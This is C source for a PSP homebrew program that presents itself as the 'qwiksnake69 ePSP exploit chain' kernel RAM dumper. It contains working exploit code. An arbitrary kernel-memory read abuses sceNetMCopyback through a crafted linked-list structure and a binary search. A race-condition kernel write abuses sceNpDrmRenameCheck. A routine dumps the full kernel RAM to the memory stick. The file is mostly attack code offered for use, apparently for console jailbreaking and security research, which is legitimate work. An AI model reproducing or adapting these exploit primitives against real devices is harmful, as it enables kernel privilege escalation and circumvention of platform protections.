/*
 *  Copyright (C) 2018 qwikrazor87/Acid_Snake
 *
 *      qwiksnake69 ePSP exploit chain
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <pspkernel.h>
#include <psputility_modules.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <pspctrl.h>
#include <pspdebug.h>
#include <string.h>

PSP_MODULE_INFO("KRAMDUMPER", 0, 1, 0);
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER);

// Two's complement MAX and MIN values
#define HIGHEST 0x7FFFFFFF
#define LOWEST 0x80000000

// initialize arg0 for a positive value
#define MAKE_ARGS_POS(args, kptr) { \
	args.next = (LinkedList*)((u8*)kptr - 12); \
	args.count = 0; \
	args.check = 2; \
	args.flag = -1; \
}

// initialize arg0 for a negative value
#define MAKE_ARGS_NEG(args, kptr) { \
	args.next = (LinkedList*)((u8*)kptr - 12); \
	args.count = LOWEST+1; \
	args.check = 2; \
	args.flag = LOWEST; \
}

#define ABS(x) ((x<0)? -1*x:x)

#define DUMP_PATH "ms0:/kram.bin"
#define BUF_SIZE 10*1024 // 10KB buffer to minimize IO
#define KBUF_SIZE 512 // size of buffer to write to kram
#define MAX_RC_ATTEMPS 500 // max attempts for race condition exploit

// Reverse Engineer of the structure passed as arg0
typedef struct LinkedList{
	struct LinkedList* next; // a0+0  -> kptr-12
	u32 unk0; // a0+4
	u32 unk1; // a0+8
	u32 count; // a0+12 -> stored in arg0.flag if *kptr >= arg1
	u16 unk2; // a0+16
	u16 check; // a0+18 -> needs to be 2 to pass some checks
	u32 unk3; // a0+20
	u32 flag; // a0+24 -> will change depending on value in kram
}LinkedList;

int sceNpDrmRenameCheck(void*);
u32 sceNetMCopyback(void*, u32, u32, u32);

/* Actual code to trigger the kram read vulnerability.
	We can read the value stored at any location in Kram.
*/
u32 readKram(void* kptr){
	LinkedList arg0; // fucked up structure :D
	u32 arg1 = 0; // data in kram we will try to guess, initially 0 for Newton method
	u32 arg2 = 0; // needs to be 0
	u32 arg3 = 1; // needs to be != 0
	
	/*
		if (*kptr >= arg1) arg0.flag = arg0.count;
		use Newton method to figure out the result in O(logn) time; max 5 iterations :D
	*/
	u32 high = HIGHEST;
	u32 low = LOWEST;
	u32 flag;
	do{
		// issue call and check result
		if ((s32)arg1 < 0){ // negative value
			MAKE_ARGS_NEG(arg0, kptr);
			flag = arg0.flag;
			sceNetMCopyback(&arg0, arg1+arg0.count, arg2, arg3);
		}
		else{ // positive value
			MAKE_ARGS_POS(arg0, kptr);
			flag = arg0.flag;
			sceNetMCopyback(&arg0, arg1, arg2, arg3);
		}
		if (arg0.flag != flag){ // check if flag has changed
			low = arg1;
		}
		else{
			high = arg1;
		}
		arg1 = (high+low)/2; // calculate next attempt
	}while (ABS(high-low) > 1); // iterate until the difference is 1
	return low;
}

// write a buffer to KRAM using the sceNpDrmRenameCheck race condition exploit
void writeKram(){
	// buffer to copy, initially path to EDAT file
	static char buf[KBUF_SIZE+1] = "ms0:/PSP/GAME/KDumper_RW/dummy.bin";

	int size = strlen(buf);
	int i;
	
	// fill buffer with our desired data
	for (i=size+1; i<KBUF_SIZE; i++){
		buf[i] = 'a';
	}
	
	// TODO: decrypt buffer so it shows up correctly in kram
	
	// race condition thread
	int fucked_thread(){
		pspDebugScreenPrintf("Fucked thread started\n");
		int attempts;
		int size = strlen(buf);
		for (attempts=0; attempts<MAX_RC_ATTEMPS; attempts++){
			buf[size] = 0;
			sceKernelDelayThread(100);
			buf[size] = -1;
		}
		sceKernelExitDeleteThread(0);
		return 0;
	};
	
	// do exploit
	SceUID fth = sceKernelCreateThread("fucked_thread", &fucked_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
	sceKernelStartThread(fth, 0, NULL);
	int attempts;
	for (attempts=0; attempts<MAX_RC_ATTEMPS; attempts++){
		sceKernelDelayThread(0);
		buf[size] = 0;
		sceNpDrmRenameCheck(buf);
	}
	pspDebugScreenPrintf("Kram write complete.");
}

void testKxploit(){
	LinkedList arg0; // fucked up structure :D
	u32 arg1; // data in kram we will try to guess
	u32 arg2 = 0; // needs to be 0
	u32 arg3 = 1; // needs to be != 0
	u32 kptr = 0x88000000;
	
	MAKE_ARGS_POS(arg0, kptr);
	arg1=0;
	sceNetMCopyback(&arg0, arg1, arg2, arg3);
	pspDebugScreenPrintf("Result for arg1 = %p : %p \n", (void*)arg1, (void*)arg0.flag);
	
	MAKE_ARGS_POS(arg0, kptr);
	arg1=HIGHEST;
	sceNetMCopyback(&arg0, arg1, arg2, arg3);
	pspDebugScreenPrintf("Result for arg1 = %p : %p \n", (void*)arg1, (void*)arg0.flag);
	
	MAKE_ARGS_NEG(arg0, kptr);
	arg1=LOWEST;
	sceNetMCopyback(&arg0, arg1, arg2, arg3);
	pspDebugScreenPrintf("Result for arg1 = %p : %p \n", (void*)arg1, (void*)arg0.flag);
	
}

void dumpKram(){
	pspDebugScreenPrintf("Dumping KRAM...\n");
	SceUID fd = sceIoOpen(DUMP_PATH, PSP_O_CREAT | PSP_O_TRUNC | PSP_O_WRONLY, 0777);
	
	if (fd < 0){
		pspDebugScreenPrintf("ERROR: could not open "DUMP_PATH" for writing\n");
		return;
	}
	
	u32 kptr = 0x88000000;
	u32 size = 0x400000;
	u32 i;
	static u32 buf[BUF_SIZE];
	u32 count = 0;
	for (i=0; i<size; i+=4){
		u32 val = readKram((void*)(kptr+i));
		if (count >= BUF_SIZE){
			count = 0;
			sceIoWrite(fd, buf, sizeof(buf));
			pspDebugScreenPrintf("Bytes read: %d/%d\n", i, size);
		}
		buf[count++] = val;
	}
	if (count > 0){
		sceIoWrite(fd, buf, count*sizeof(u32));
	}
	sceIoClose(fd);
	pspDebugScreenPrintf("K RAM dumped in "DUMP_PATH"\n");
}

void printMenu(){
	pspDebugScreenPrintf("Press X to test kxploit.\n");
	pspDebugScreenPrintf("Press [] to dump kram.\n");
	pspDebugScreenPrintf("Press /\\ to write to kram\n");
	pspDebugScreenPrintf("Press O to exit.\n");
}

int main(int argc, char** argv){

	pspDebugScreenInit();
	sceCtrlSetSamplingMode(1);

	SceCtrlData gpaddata;

	{
		int i;
		for (i=0; i<7; i++)
			sceUtilityLoadModule(0x100+i);
	}
	
	printMenu();
	for (;;){
		gpaddata.Buttons = 0;
		sceCtrlPeekBufferPositive(&gpaddata,1);
		if (gpaddata.Buttons & PSP_CTRL_CROSS){
			testKxploit();
			printMenu();
		}
		else if (gpaddata.Buttons & PSP_CTRL_SQUARE){
			dumpKram();
			printMenu();
		}
		else if (gpaddata.Buttons & PSP_CTRL_TRIANGLE){
			writeKram();
			printMenu();
		}
		else if (gpaddata.Buttons & PSP_CTRL_CIRCLE){
			break;
		}
	}

	sceKernelExitGame();
	return 0;
}
